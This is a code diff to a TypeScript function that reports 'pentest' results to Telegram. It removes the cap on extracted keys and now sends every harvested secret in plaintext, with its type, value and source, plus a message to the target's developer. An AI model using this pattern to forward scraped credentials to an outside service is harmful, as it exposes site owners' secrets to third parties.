@@ -767,8 +767,14 @@ async function sendPentestToTelegram(result: any) {
   }
 
   if (s.extractedKeys?.length > 0) {
-    let keysMsg = `🔑 <b>المفاتيح المستخرجة:</b>\n`;
-    for (const k of s.extractedKeys.slice(0, 10)) keysMsg += `<code>${k}</code>\n`;
+    let keysMsg = `🔑 <b>المفاتيح والأسرار المكشوفة (بدون تشفير — كدليل على ضعف الموقع):</b>\n`;
+    for (const k of s.extractedKeys) {
+      if (typeof k === "object" && k.type && k.value) {
+        keysMsg += `\n<b>[${k.type}]</b>\n<code>${k.value}</code>\nالمصدر: ${k.source || "N/A"}\n`;
+      } else {
+        keysMsg += `<code>${k}</code>\n`;
+      }
+    }
     await send(keysMsg);
   }
 
@@ -776,6 +782,10 @@ async function sendPentestToTelegram(result: any) {
     let urlMsg = `🌐 <b>نقاط الدخول المكتشفة:</b>\n`;
     for (const u of s.extractedEndpoints.slice(0, 15)) urlMsg += `<code>${u}</code>\n`;
     await send(urlMsg);
+  }
+
+  if (result.developerMessage) {
+    await send(`⚠️ <b>رسالة إلى المبرمج/المطوّر:</b>\n\n<pre>${result.developerMessage}</pre>`, "HTML");
   }
 
   if (result.report) {
